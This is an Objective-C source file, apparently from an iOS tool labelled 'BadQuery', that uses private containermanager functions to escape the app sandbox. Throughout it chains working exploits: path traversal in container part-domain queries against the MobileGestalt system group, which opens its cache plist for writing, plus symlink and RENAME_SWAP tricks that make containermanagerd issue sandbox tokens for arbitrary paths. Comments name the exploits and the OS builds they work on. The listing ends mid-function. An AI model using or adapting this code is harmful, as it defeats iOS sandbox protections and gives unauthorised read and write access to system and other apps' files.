#import "BQCore.h"

#import <dirent.h>
#import <dlfcn.h>
#import <errno.h>
#import <fcntl.h>
#import <limits.h>
#import <stdio.h>
#import <stdlib.h>
#import <string.h>
#import <sys/fsgetpath.h>
#import <sys/mount.h>
#import <sys/stat.h>
#import <sys/stdio.h>
#import <sys/xattr.h>
#import <unistd.h>
#import <xpc/xpc.h>

NSString *const BQErrorDomain = @"BQErrorDomain";

static NSString *const kMHAIdentifier = @"com.apple.mobile.MobileHouseArrest";
static NSString *const kMGMobileGestaltGroup = @"systemgroup.com.apple.mobilegestaltcache";
static NSString *const kMGCaches =
    @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";

static NSString *gLastError;
static NSString *gEscapeGroupRoot;
static NSMutableDictionary<NSNumber *, NSString *> *gEscapePaths;
static NSMutableDictionary<NSString *, NSMutableDictionary<NSString *, id> *> *gLeases;

// ---------------------------------------------------------------- MCM API ---

typedef void *(*fn_query_create)(void);
typedef void (*fn_query_set_class)(void *, uint64_t);
typedef void (*fn_query_set_ids)(void *, xpc_object_t);
typedef void (*fn_query_set_group_ids)(void *, xpc_object_t);
typedef void (*fn_query_set_flags)(void *, uint64_t);
typedef void (*fn_query_set_part)(void *, uint64_t);
typedef void (*fn_query_set_domain)(void *, const char *);
typedef void *(*fn_query_get_single)(void *);
typedef bool (*fn_query_iterate)(void *, bool (^)(void *));
typedef void *(*fn_query_get_error)(void *);
typedef int (*fn_error_posix)(void *);
typedef const char *(*fn_error_message)(void *);
typedef void (*fn_query_free)(void *);
typedef const char *(*fn_object_get_path)(void *);
typedef const char *(*fn_object_get_identifier)(void *);
typedef void *(*fn_object_copy)(void *);
typedef char *(*fn_object_copy_token)(void *);
typedef bool (*fn_object_activate)(void *, bool);
typedef void (*fn_object_free)(void *);
typedef int64_t (*fn_sandbox_consume)(const char *);
typedef int (*fn_sandbox_release)(int64_t);

typedef struct {
    void *handle;
    fn_query_create queryCreate;
    fn_query_set_class querySetClass;
    fn_query_set_ids querySetIds;
    fn_query_set_group_ids querySetGroupIds;
    fn_query_set_flags querySetFlags;
    fn_query_set_part querySetPart;
    fn_query_set_domain querySetDomain;
    fn_query_get_single queryGetSingle;
    fn_query_iterate queryIterate;
    fn_query_get_error queryGetError;
    fn_error_posix errorPosix;
    fn_error_message errorMessage;
    fn_query_free queryFree;
    fn_object_get_path objectGetPath;
    fn_object_get_identifier objectGetIdentifier;
    fn_object_copy objectCopy;
    fn_object_copy_token objectCopyToken;
    fn_object_activate objectActivate;
    fn_object_free objectFree;
    fn_sandbox_consume sandboxConsume;
    fn_sandbox_release sandboxRelease;
} BQAPI;

static BQAPI *BQShared(void) {
    static BQAPI api;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        api.handle = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
        void *handle = api.handle ?: RTLD_DEFAULT;
#define BQ_LOAD(field, symbol) api.field = (__typeof(api.field))dlsym(handle, symbol)
        BQ_LOAD(queryCreate, "container_query_create");
        BQ_LOAD(querySetClass, "container_query_set_class");
        BQ_LOAD(querySetIds, "container_query_set_identifiers");
        BQ_LOAD(querySetGroupIds, "container_query_set_group_identifiers");
        BQ_LOAD(querySetFlags, "container_query_operation_set_flags");
        BQ_LOAD(querySetPart, "container_query_operation_set_part");
        BQ_LOAD(querySetDomain, "container_query_operation_set_part_domain");
        BQ_LOAD(queryGetSingle, "container_query_get_single_result");
        BQ_LOAD(queryIterate, "container_query_iterate_results_sync");
        BQ_LOAD(queryGetError, "container_query_get_last_error");
        BQ_LOAD(errorPosix, "container_error_get_posix_errno");
        BQ_LOAD(errorMessage, "container_error_get_message");
        BQ_LOAD(queryFree, "container_query_free");
        BQ_LOAD(objectGetPath, "container_object_get_path");
        BQ_LOAD(objectGetIdentifier, "container_object_get_identifier");
        BQ_LOAD(objectCopy, "container_object_copy");
        BQ_LOAD(objectCopyToken, "container_copy_sandbox_token");
        BQ_LOAD(objectActivate, "container_object_sandbox_extension_activate");
        BQ_LOAD(objectFree, "container_object_free");
#undef BQ_LOAD
        api.sandboxConsume = (fn_sandbox_consume)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
        api.sandboxRelease = (fn_sandbox_release)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    });
    return &api;
}

static void BQSetLastError(NSString *message) {
    gLastError = message;
}

static void BQLog(NSString *format, ...) {
    va_list arguments;
    va_start(arguments, format);
    NSString *message = [[NSString alloc] initWithFormat:format arguments:arguments];
    va_end(arguments);
    NSLog(@"[BadQuery] %@", message);
}

static NSString *BQDescribeQueryError(BQAPI *api, void *query, NSString *where) {
    if (!query || !api->queryGetError) return [NSString stringWithFormat:@"%@: query returned no result", where];
    void *err = api->queryGetError(query);
    if (!err) return [NSString stringWithFormat:@"%@: query returned no result", where];
    int posix = api->errorPosix ? api->errorPosix(err) : 0;
    const char *message = api->errorMessage ? api->errorMessage(err) : NULL;
    return [NSString stringWithFormat:@"%@: posix=%d message=%s", where, posix, message ?: "(null)"];
}

static NSString *BQNormalizedContainerPath(const char *rawPath) {
    if (!rawPath) return nil;
    NSString *path = [NSString stringWithUTF8String:rawPath];
    if ([path isEqualToString:@"/var"] || [path hasPrefix:@"/var/"]) {
        path = [@"/private" stringByAppendingString:path];
    }
    return path.length ? path : nil;
}

// ------------------------------------------------------------ entitlements ---

static NSArray<NSString *> *BQReadAppGroupEntitlement(void) {
    void *sec = dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_NOW);
    typedef CFTypeRef (*create_fn)(CFAllocatorRef);
    typedef CFTypeRef (*copy_ent_fn)(CFTypeRef, CFStringRef, CFErrorRef *);
    create_fn create = (create_fn)dlsym(RTLD_DEFAULT, "SecTaskCreateFromSelf");
    if (!create && sec) create = (create_fn)dlsym(sec, "SecTaskCreateFromSelf");
    copy_ent_fn copy = (copy_ent_fn)dlsym(RTLD_DEFAULT, "SecTaskCopyValueForEntitlement");
    if (!copy && sec) copy = (copy_ent_fn)dlsym(sec, "SecTaskCopyValueForEntitlement");
    if (!create || !copy) return @[];

    CFTypeRef task = create(kCFAllocatorDefault);
    if (!task) return @[];
    CFTypeRef value = copy(task, CFSTR("com.apple.security.application-groups"), NULL);
    NSMutableArray<NSString *> *groups = [NSMutableArray array];
    if (value && CFGetTypeID(value) == CFArrayGetTypeID()) {
        CFArrayRef array = (CFArrayRef)value;
        for (CFIndex i = 0; i < CFArrayGetCount(array); i++) {
            CFTypeRef entry = CFArrayGetValueAtIndex(array, i);
            if (entry && CFGetTypeID(entry) == CFStringGetTypeID()) {
                [groups addObject:[(__bridge NSString *)entry copy]];
            }
        }
    }
    if (value) CFRelease(value);
    CFRelease(task);
    return groups;
}

// ------------------------------------------------------------ os version ---

static NSInteger BQOSMajor(void) {
    static NSInteger major = 0;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        major = NSProcessInfo.processInfo.operatingSystemVersion.majorVersion;
    });
    return major;
}

/// worse_query: iOS 26.x needs the alternate app-group flag layout; 27.x the
/// canonical one. Primary order follows the OS major; the other is probed too.
static NSArray<NSNumber *> *BQClass7FlagCandidates(void) {
    if (BQOSMajor() >= 27) {
        return @[@0x8000000000ULL, @0x0800000000ULL];
    }
    return @[@0x0800000000ULL, @0x8000000000ULL];
}

// ------------------------------------------------- worse_query hardening ---

/// Chuẩn hoá đường dẫn như worse_query yêu cầu: /var → /private/var.
static NSString *BQNormPath(NSString *path) {
    if (!path.length) return path;
    NSString *normalized = path.stringByStandardizingPath;
    if ([normalized hasPrefix:@"/var/"]) {
        normalized = [@"/private" stringByAppendingString:normalized];
    }
    return normalized;
}

/// Token coi như thành công trừ khi sandbox trả EPERM — EACCES là quyền file
/// (container của root), token không thay đổi được.
static BOOL BQTokenOpensPath(NSString *path) {
    struct stat st;
    if (lstat(path.fileSystemRepresentation, &st) != 0) return NO;
    int fd = open(path.fileSystemRepresentation, O_RDONLY | O_NOFOLLOW | O_NONBLOCK | O_CLOEXEC);
    if (fd >= 0) {
        close(fd);
        return YES;
    }
    return errno != EPERM;
}

/// Nhớ bộ flag class-7 chạy được trên máy này (1 lần thử thay vì 2).
static int gClass7AltPreference = -1;

/// worse_query hoán đổi Library/Caches của app group — tuần tự hoá để hai
/// luồng không swap chồng nhau.
static NSRecursiveLock *gClass7Lock;

/// Kernel giới hạn số sandbox extension mỗi tiến trình; giữ bộ token sống có
/// hạn, token cũ bị thu hồi và sẽ được grant lại khi cần.
static const NSUInteger kBQMaxLiveHandles = 160;
static NSMutableArray<NSNumber *> *gLiveHandles;

static void BQGrantCachePurge(int64_t handle);

static void BQTrackHandle(int64_t handle) {
    if (handle < 0) return;
    if (!gLiveHandles) gLiveHandles = [NSMutableArray array];
    [gLiveHandles addObject:@(handle)];
    while (gLiveHandles.count > kBQMaxLiveHandles) {
        int64_t oldest = gLiveHandles.firstObject.longLongValue;
        [gLiveHandles removeObjectAtIndex:0];
        if (BQShared()->sandboxRelease) BQShared()->sandboxRelease(oldest);
        if (gEscapePaths) [gEscapePaths removeObjectForKey:@(oldest)];
        BQGrantCachePurge(oldest);
    }
}

/// Cache grant theo đường dẫn: mở lại cùng container là tức thì (không swap +
/// query lại). Token được giữ tới khi vượt hạn mức (BQTrackHandle thu hồi).
static NSMutableDictionary<NSString *, NSNumber *> *gGrantCache;
static NSMutableArray<NSString *> *gGrantOrder;

static void BQGrantCachePurge(int64_t handle) {
    if (!gGrantCache) return;
    NSArray<NSString *> *keys = [gGrantCache allKeysForObject:@(handle)];
    for (NSString *key in keys) {
        [gGrantCache removeObjectForKey:key];
        [gGrantOrder removeObject:key];
    }
}

static void BQGrantCacheStore(NSString *path, int64_t handle) {
    if (!path.length || handle < 0) return;
    if (!gGrantCache) {
        gGrantCache = [NSMutableDictionary dictionary];
        gGrantOrder = [NSMutableArray array];
    }
    if (gGrantCache[path]) return;
    gGrantCache[path] = @(handle);
    [gGrantOrder addObject:path];
}

static int64_t BQGrantCacheLookup(NSString *path) {
    if (!path.length || !gGrantCache) return -1;
    NSNumber *known = gGrantCache[path];
    if (!known) return -1;
    [gGrantOrder removeObject:path];
    [gGrantOrder addObject:path];
    return known.longLongValue;
}

static NSDictionary<NSString *, NSString *> *BQContainerIdentifierMap(void);

/// Identifier của container: xattr (nhanh) → map containermanager (không cần
/// quyền file) → metadata plist (thường root-only nên chỉ là chốt cuối).
static NSString *BQIdentifierForContainer(NSString *path) {
    if (!path.length) return nil;
    NSString *dir = BQNormPath(path);

    char buffer[512];
    ssize_t length = getxattr(dir.fileSystemRepresentation,
                              "com.apple.containermanager.identifier",
                              buffer, sizeof(buffer) - 1, 0, 0);
    if (length > 0) {
        buffer[length] = 0;
        return [NSString stringWithUTF8String:buffer];
    }

    NSString *fromMap = BQContainerIdentifierMap()[dir];
    if (fromMap.length) return fromMap;

    NSString *metadata = [dir stringByAppendingPathComponent:@".com.apple.mobile_container_manager.metadata.plist"];
    NSData *data = [NSData dataWithContentsOfFile:metadata];
    if (data.length) {
        NSDictionary *plist = [NSPropertyListSerialization propertyListWithData:data
                                                                       options:0
                                                                        format:NULL
                                                                         error:nil];
        id identifier = [plist isKindOfClass:NSDictionary.class] ? plist[@"MCMMetadataIdentifier"] : nil;
        if ([identifier isKindOfClass:NSString.class] && [identifier length]) {
            return identifier;
        }
    }
    return nil;
}

/// Map path → identifier qua containermanager cho mọi class container.
/// Cache 60 giây vì label được hỏi cho từng dòng.
static NSDictionary<NSString *, NSString *> *BQContainerIdentifierMap(void) {
    static NSDictionary<NSString *, NSString *> *cached;
    static NSTimeInterval cachedAt;
    static NSLock *lock;
    static dispatch_once_t once;
    dispatch_once(&once, ^{ lock = [NSLock new]; });

    [lock lock];
    NSTimeInterval now = NSDate.date.timeIntervalSinceReferenceDate;
    if (cached && now - cachedAt < 60) {
        NSDictionary *result = cached;
        [lock unlock];
        return result;
    }

    NSMutableDictionary<NSString *, NSString *> *map = [NSMutableDictionary dictionary];
    BQAPI *api = BQShared();
    if (api->queryCreate && api->querySetClass && api->queryIterate &&
        api->objectGetPath && api->objectGetIdentifier) {
        const uint64_t classes[] = { 0, 2, 5, 7, 8, 10, 11, 13 };
        for (size_t index = 0; index < sizeof(classes) / sizeof(classes[0]); index++) {
            void *query = api->queryCreate();
            if (!query) continue;
            api->querySetClass(query, classes[index]);
            api->queryIterate(query, ^bool(void *object) {
                if (!object) return true;
                const char *pathC = api->objectGetPath(object);
                const char *identifierC = api->objectGetIdentifier(object);
                if (!pathC || !pathC[0] || !identifierC || !identifierC[0]) return true;
                NSString *containerPath = [NSString stringWithUTF8String:pathC];
                NSString *identifier = [NSString stringWithUTF8String:identifierC];
                if (containerPath.length && identifier.length) {
                    map[BQNormPath(containerPath)] = identifier;
                }
                return true;
            });
            api->queryFree(query);
        }
    }

    cached = map;
    cachedAt = now;
    [lock unlock];
    return cached;
}

// ---------------------------------------------------------------- helpers ---

static BOOL BQCanOpenDirectory(NSString *path) {
    if (!path.length) return NO;
    DIR *dir = opendir(path.fileSystemRepresentation);
    if (!dir) return NO;
    closedir(dir);
    return YES;
}

static NSString *BQDots(int count) {
    NSMutableArray<NSString *> *parts = [NSMutableArray array];
    for (int i = 0; i < count; i++) [parts addObject:@".."];
    return [parts componentsJoinedByString:@"/"];
}

static void BQRecoverPath(NSString *path, NSString *backup) {
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:backup]) return;
    [fm removeItemAtPath:path error:nil];
    NSError *error = nil;
    if (![fm moveItemAtPath:backup toPath:path error:&error]) {
        NSLog(@"[BadQuery] recover %@ -> %@ failed: %@", backup, path, error.localizedDescription);
    }
}

static void BQRestorePath(NSString *path, NSString *backup) {
    NSFileManager *fm = [NSFileManager defaultManager];
    if ([fm fileExistsAtPath:backup]) {
        [fm removeItemAtPath:path error:nil];
        NSError *error = nil;
        if (![fm moveItemAtPath:backup toPath:path error:&error]) {
            NSLog(@"[BadQuery] restore %@ -> %@ failed: %@", backup, path, error.localizedDescription);
        }
    } else {
        struct stat st;
        if (lstat(path.fileSystemRepresentation, &st) == 0 && S_ISLNK(st.st_mode)) {
            [fm removeItemAtPath:path error:nil];
        }
        if (![fm fileExistsAtPath:path]) {
            [fm createDirectoryAtPath:path withIntermediateDirectories:YES attributes:nil error:nil];
        }
    }
}

/// Move `path` aside to `backup` and replace it with a symlink to `target`.
static BOOL BQSwapPathWithSymlink(NSString *path, NSString *target, NSString *backup) {
    NSFileManager *fm = [NSFileManager defaultManager];
    [fm removeItemAtPath:backup error:nil];
    if ([fm fileExistsAtPath:path]) {
        NSError *error = nil;
        if (![fm moveItemAtPath:path toPath:backup error:&error]) {
            NSLog(@"[BadQuery] swap move %@ -> %@ failed: %@", path, backup, error.localizedDescription);
            return NO;
        }
    }
    unlink(path.fileSystemRepresentation);
    errno = 0;
    if (symlink(target.fileSystemRepresentation, path.fileSystemRepresentation) != 0) {
        NSLog(@"[BadQuery] symlink %@ -> %@ failed errno=%d (%s)", path, target, errno, strerror(errno));
        if ([fm fileExistsAtPath:backup]) [fm moveItemAtPath:backup toPath:path error:nil];
        return NO;
    }
    return YES;
}

static dispatch_once_t gInitOnce;
static void BQRecoverInterruptedState(void) {
    NSString *home = NSHomeDirectory();
    if (!home.length) return;

    // class-2 swap leftover: Library/Caches is a symlink and the real directory
    // was parked at Library/.bq_cache_link.
    NSString *caches = [home stringByAppendingPathComponent:@"Library/Caches"];
    NSString *temp = [home stringByAppendingPathComponent:@"Library/.bq_cache_link"];
    struct stat st;
    struct stat ts;
    if (lstat(caches.fileSystemRepresentation, &st) == 0 && S_ISLNK(st.st_mode) &&
        lstat(temp.fileSystemRepresentation, &ts) == 0) {
        if (renameatx_np(AT_FDCWD, caches.fileSystemRepresentation,
                         AT_FDCWD, temp.fileSystemRepresentation, RENAME_SWAP) == 0) {
            unlink(temp.fileSystemRepresentation);
            NSLog(@"[BadQuery] recovered interrupted class-2 swap");
        }
    } else if (lstat(temp.fileSystemRepresentation, &ts) == 0 && S_ISLNK(ts.st_mode)) {
        unlink(temp.fileSystemRepresentation);
    }

    // class-2 stage leftovers.
    NSString *stageTag = [NSString stringWithFormat:@".bq_stage_%d", getpid()];
    (void)stageTag;
}

static NSString *BQEscapePathForHandle(int64_t handle);

// ------------------------------------------------------------------ escape ---

/// Generic MCM query: set identifiers, part, optional part-domain and flags,
/// then fetch the single result, copy its sandbox token and consume it.
/// Returns the sandbox-extension handle (>= 0) on success.
static int64_t BQQueryEscape(uint64_t cls,
                             NSString *identifier,
                             BOOL group,
                             uint64_t part,
                             NSString *domain,
                             uint64_t flags,
                             NSString *label,
                             NSString **outPath) {
    BQAPI *api = BQShared();
    if (!api->queryCreate || !identifier.length) return -1;

    void *query = api->queryCreate();
    if (!query) return -2;

    api->querySetClass(query, cls);
    xpc_object_t value = xpc_string_create(identifier.UTF8String);
    if (group && api->querySetGroupIds) api->querySetGroupIds(query, value);
    else if (api->querySetIds) api->querySetIds(query, value);
    else if (api->querySetGroupIds) api->querySetGroupIds(query, value);
    if (api->querySetPart) api->querySetPart(query, part);
    if (domain.length && api->querySetDomain) api->querySetDomain(query, domain.UTF8String);
    if (api->querySetFlags) api->querySetFlags(query, flags);
#if !OS_OBJECT_USE_OBJC
    if (value) xpc_release(value);
#endif

    void *result = api->queryGetSingle(query);
    NSString *path = nil;
    if (result && api->objectGetPath) {
        path = BQNormalizedContainerPath(api->objectGetPath(result));
    }
    char *token = (result && api->objectCopyToken) ? api->objectCopyToken(result) : NULL;
    int64_t handle = (token && api->sandboxConsume) ? api->sandboxConsume(token) : -5;

    NSLog(@"[BadQuery] %@ class=%llu identifier=%@ result=%p token=%s consume=%lld",
          label, cls, identifier, result, token ? "yes" : "no", (long long)handle);
    if (!result) {
        gLastError = BQDescribeQueryError(api, query, label);
        NSLog(@"[BadQuery] %@", gLastError);
    }
    if (token) free(token);
    api->queryFree(query);

    if (handle >= 0 && outPath) *outPath = path;
    return handle;
}

/// Resolve a container path without consuming a sandbox token.
static NSString *BQQueryPathOnly(uint64_t cls, NSString *identifier, BOOL group, uint64_t part, uint64_t flags) {
    BQAPI *api = BQShared();
    if (!api->queryCreate || !identifier.length) return nil;

    void *query = api->queryCreate();
    if (!query) return nil;

    api->querySetClass(query, cls);
    xpc_object_t value = xpc_string_create(identifier.UTF8String);
    if (group && api->querySetGroupIds) api->querySetGroupIds(query, value);
    else if (api->querySetIds) api->querySetIds(query, value);
    if (api->querySetPart) api->querySetPart(query, part);
    if (api->querySetFlags) api->querySetFlags(query, flags);
#if !OS_OBJECT_USE_OBJC
    if (value) xpc_release(value);
#endif

    void *result = api->queryGetSingle(query);
    NSString *path = result && api->objectGetPath ? BQNormalizedContainerPath(api->objectGetPath(result)) : nil;
    api->queryFree(query);
    return path;
}

static void BQRecordEscape(int64_t handle, NSString *path) {
    if (handle < 0 || !path.length) return;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        gEscapePaths = [NSMutableDictionary dictionary];
    });
    gEscapePaths[@(handle)] = path;
    BQTrackHandle(handle);
}

/// bad_query file form: class 13 against the MobileGestalt SystemGroup with an
/// 8-level traversal and flags 0x8000000000. Works on some 27.x builds with
/// free-account signatures. Used for Library/Caches targets.
static int64_t BQEscapeBadQueryFile(NSString *caches) {
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:caches]) return -1;

    NSString *file1 = [caches stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
    NSString *file2 = [file1 hasPrefix:@"/private/var/"]
        ? [@"/var/" stringByAppendingString:[file1 substringFromIndex:@"/private/var/".length]]
        : file1;

    int64_t last = -1;
    for (NSString *file in @[file2, file1]) {
        if (![file isAbsolutePath]) continue;
        NSString *domain = [BQDots(8) stringByAppendingString:file];
        NSString *path = nil;
        int64_t handle = BQQueryEscape(13, kMGMobileGestaltGroup, YES, 3, domain, 0x8000000000ULL,
                                       @"bad-query-file", &path);
        if (handle < 0) {
            last = handle;
            continue;
        }
        int fd = open(file.fileSystemRepresentation, O_RDWR | O_CLOEXEC);
        if (fd >= 0) {
            close(fd);
            BQRecordEscape(handle, file);
            return handle;
        }
        NSLog(@"[BadQuery] bad-query-file: token did not open %@ errno=%d", file, errno);
        if (BQShared()->sandboxRelease) BQShared()->sandboxRelease(handle);
        last = -5;
    }
    return last;
}

/// Class-13 traversal (bad_query lineage): works on builds where the part-domain
/// traversal is not patched (27.0.x).
static int64_t BQEscapeClass13Traversal(NSString *target) {
    NSString *domain = [BQDots(12) stringByAppendingString:target];
    NSString *path = nil;
    int64_t handle = BQQueryEscape(13, kMGMobileGestaltGroup, YES, 3, domain, 0x8000000000ULL,
                                   @"class13-traversal", &path);
    if (handle < 0) return handle;
    NSString *resolved = path.length ? path : target;
    if (!BQCanOpenDirectory(resolved)) {
        NSLog(@"[BadQuery] class13-traversal: token did not open %@", resolved);
        if (BQShared()->sandboxRelease) BQShared()->sandboxRelease(handle);
        return -5;
    }
    BQRecordEscape(handle, resolved);
    return handle;
}

/// Class-12 geod built-in container: direct token, then symlink its writable
/// Library/Caches to the target and query again.
static int64_t BQEscapeGeodSymlink(NSString *target) {
    BQAPI *api = BQShared();
    NSString *geod = @"com.apple.geod";

    NSString *caches = BQQueryPathOnly(12, geod, NO, 3, 0x100000000ULL);
    if (!caches.length) {
        NSString *root = BQQueryPathOnly(12, geod, NO, 0, 0x100000000ULL);
        if (root.length) caches = [root stringByAppendingPathComponent:@"Library/Caches"];
    }
    if (!caches.length) return -2;

    NSArray<NSNumber *> *flagChoices = @[@0x8000000000ULL, @0x0800000000ULL, @0x8100000000ULL];
    int64_t firstHandle = -1;
    uint64_t useFlags = 0;
    NSString *path = nil;
    for (NSNumber *flags in flagChoices) {
        firstHandle = BQQueryEscape(12, geod, NO, 3, @"", flags.unsignedLongLongValue,
                                    @"class12-geod-direct", &path);
        if (firstHandle >= 0) {
            useFlags = flags.unsignedLongLongValue;
            break;
        }
    }
    if (firstHandle < 0) return firstHandle;

    NSFileManager *fm = [NSFileManager defaultManager];
    [fm createDirectoryAtPath:caches.stringByDeletingLastPathComponent
  withIntermediateDirectories:YES attributes:nil error:nil];
    if (!BQCanOpenDirectory(caches)) {
        NSLog(@"[BadQuery] geod: token did not open %@ errno=%d", caches, errno);
        if (api->sandboxRelease) api->sandboxRelease(firstHandle);
        return -5;
    }

    NSString *backup = [caches stringByAppendingString:@".bqgeod"];
    BQRecoverPath(caches, backup);
    if (!BQSwapPathWithSymlink(caches, target, backup)) {
        BQRestorePath(caches, backup);
        if (api->sandboxRelease) api->sandboxRelease(firstHandle);
        return -2;
    }

    NSString *path2 = nil;
    int64_t secondHandle = BQQueryEscape(12, geod, NO, 3, @"", useFlags, @"class12-geod-symlink", &path2);
    BOOL usable = secondHandle >= 0 && BQCanOpenDirectory(target);
    if (secondHandle >= 0 && !usable) {
        NSLog(@"[BadQuery] geod: symlink token did not open target");
        if (api->sandboxRelease) api->sandboxRelease(secondHandle);
    }
    BQRestorePath(caches, backup);
    if (api->sandboxRelease) api->sandboxRelease(firstHandle);

    if (usable) {
        BQRecordEscape(secondHandle, target);
        return secondHandle;
    }
    return -5;
}

/// Class-7 part-directory symlink: replace the app group's Library/Caches with a
/// symlink to the target; containermanagerd resolves it while issuing the token.
static int64_t BQEscapeClass7Symlink(NSString *target) {
    NSArray<NSString *> *groupIDs = BQReadAppGroupEntitlement();
    if (!groupIDs.count) return -6;

    target = BQNormPath(target);
    static dispatch_once_t lockOnce;
    dispatch_once(&lockOnce, ^{
        if (!gClass7Lock) gClass7Lock = [NSRecursiveLock new];
    });
    [gClass7Lock lock];
    @try {
        NSFileManager *fm = [NSFileManager defaultManager];
        for (NSString *groupID in groupIDs) {
            NSURL *groupURL = [fm containerURLForSecurityApplicationGroupIdentifier:groupID];
            NSString *groupRoot = groupURL.path;
            if (!groupRoot.length) continue;

            NSString *library = [groupRoot stringByAppendingPathComponent:@"Library"];
            NSString *caches = [library stringByAppendingPathComponent:@"Caches"];
            NSString *backup = [library stringByAppendingPathComponent:@"Caches.bqtool"];
            [fm createDirectoryAtPath:library withIntermediateDirectories:YES attributes:nil error:nil];
            BQRecoverPath(caches, backup);
            if (![fm fileExistsAtPath:caches]) {
                [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];
            }
            if (!BQSwapPathWithSymlink(caches, target, backup)) {
                BQRestorePath(caches, backup);
                continue;
            }

            NSArray<NSNumber *> *allFlags = BQClass7FlagCandidates();
            NSMutableArray<NSNumber *> *ordered = [NSMutableArray arrayWithArray:allFlags];
            if (gClass7AltPreference >= 0) {
                NSUInteger preferredIndex = gClass7AltPreference == 1 ? ordered.count - 1 : 0;
                NSNumber *preferred = ordered[preferredIndex];
                [ordered removeObjectAtIndex:preferredIndex];
                [ordered insertObject:preferred atIndex:0];
            }

            for (NSNumber *flags in ordered) {
                NSString *path = nil;
                int64_t handle = BQQueryEscape(7, groupID, YES, 3, @"",
                                               flags.unsignedLongLongValue,
                                               [NSString stringWithFormat:@"worse_query/class7-symlink/0x%llx/%@",
                                                flags.unsignedLongLongValue, groupID],
                                               &path);
                if (handle >= 0 && BQTokenOpensPath(target)) {
                    gClass7AltPreference =
                        (flags.unsignedLongLongValue == allFlags.lastObject.unsignedLongLongValue) ? 1 : 0;
                    gEscapeGroupRoot = groupRoot;
                    BQRecordEscape(handle, target);
                    BQLog(@"escape: worse_query (class-7, flags=0x%llx)", flags.unsignedLongLongValue);
                    return handle;
                }
                if (handle >= 0 && BQShared()->sandboxRelease) BQShared()->sandboxRelease(handle);
            }
            BQRestorePath(caches, backup);
        }
    } @finally {
        [gClass7Lock unlock];
    }
    return -5;
}

/// Class-2 RENAME_SWAP: atomically swap the app's own Library/Caches with a
/// symlink to the target, query class 2, then swap back. No app group required.
static int64_t BQEscapeClass2Swap(NSString *target) {
    BQAPI *api = BQShared();
    NSString *home = NSHomeDirectory();
    NSString *bundleID = [NSBundle mainBundle].bundleIdentifier;
    if (!home.length || !bundleID.length) return -6;

    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *library = [home stringByAppendingPathComponent:@"Library"];
    NSString *caches = [library stringByAppendingPathComponent:@"Caches"];
    NSString *temp = [library stringByAppendingPathComponent:@".bq_cache_link"];
    [fm createDirectoryAtPath:library withIntermediateDirectories:YES attributes:nil error:nil];

    BQRecoverInterruptedState();
    unlink(temp.fileSystemRepresentation);
    if (symlink(target.fileSystemRepresentation, temp.fileSystemRepresentation) != 0) return -2;

    if (renameatx_np(AT_FDCWD, caches.fileSystemRepresentation,
                     AT_FDCWD, temp.fileSystemRepresentation, RENAME_SWAP) != 0) {
        NSLog(@"[BadQuery] class2-swap: RENAME_SWAP failed errno=%d (%s)", errno, strerror(errno));
        unlink(temp.fileSystemRepresentation);
        return -2;
    }

    NSString *path = nil;
    int64_t handle = BQQueryEscape(2, bundleID, NO, 3, @"", 0x8000000000ULL, @"class2-swap", &path);
    BOOL usable = handle >= 0 && BQCanOpenDirectory(target);
    if (handle >= 0 && !usable) {
        NSLog(@"[BadQuery] class2-swap: token did not open target");
        if (api->sandboxRelease) api->sandboxRelease(handle);
    }

    if (renameatx_np(AT_FDCWD, caches.fileSystemRepresentation,
                     AT_FDCWD, temp.fileSystemRepresentation, RENAME_SWAP) != 0) {
        NSLog(@"[BadQuery] class2-swap: swap back failed errno=%d (%s)", errno, strerror(errno));
    }
    unlink(temp.fileSystemRepresentation);

    if (usable) {
        BQRecordEscape(handle, target);
        return handle;
    }
    return -5;
}

/// Class-2 staged symlink: build a tiny fake tree inside the app's own Caches
/// and let a part-domain symlink resolve to the target. No app group required.
static int64_t BQEscapeClass2Stage(NSString *target) {
    BQAPI *api = BQShared();
    NSString *home = NSHomeDirectory();
    NSString *bundleID = [NSBundle mainBundle].bundleIdentifier;
    if (!home.length || !bundleID.length || !api->querySetDomain) return -6;

    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *caches = [[home stringByAppendingPathComponent:@"Library"] stringByAppendingPathComponent:@"Caches"];
    [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];

    NSString *stage = [caches stringByAppendingPathComponent:[NSString stringWithFormat:@".bq_stage_%d", getpid()]];
    NSString *link = [caches stringByAppendingPathComponent:[NSString stringWithFormat:@".bq_slink_%d", getpid()]];
    NSString *stageLibrary = [stage stringByAppendingPathComponent:@"Library"];
    NSString *stageCaches = [stageLibrary stringByAppendingPathComponent:@"Caches"];

    [fm removeItemAtPath:stage error:nil];
    unlink(link.fileSystemRepresentation);
    if (![fm createDirectoryAtPath:stageLibrary withIntermediateDirectories:YES attributes:nil error:nil]) return -2;
    if (symlink(target.fileSystemRepresentation, stageCaches.fileSystemRepresentation) != 0) {
        [fm removeItemAtPath:stage error:nil];
        return -2;
    }
    if (symlink(stage.fileSystemRepresentation, link.fileSystemRepresentation) != 0) {
        unlink(stageCaches.fileSystemRepresentation);
        [fm removeItemAtPath:stage error:nil];
        return -2;
    }

    NSArray<NSString *> *domains = @[
        [@"Library/Caches/" stringByAppendingString:link.lastPathComponent],
        [@"Caches/" stringByAppendingString:link.lastPathComponent],
        link.lastPathComponent,
    ];

    int64_t last = -1;
    for (NSString *domain in domains) {
        NSString *path = nil;
        int64_t handle = BQQueryEscape(2, bundleID, NO, 3, domain, 0x8000000000ULL,
                                       [@"class2-stage-" stringByAppendingString:domain], &path);
        if (handle >= 0) {
            if (BQCanOpenDirectory(target)) {
                unlink(link.fileSystemRepresentation);
                unlink(stageCaches.fileSystemRepresentation);
                rmdir(stageLibrary.fileSystemRepresentation);
                rmdir(stage.fileSystemRepresentation);
                BQRecordEscape(handle, target);
                return handle;
            }
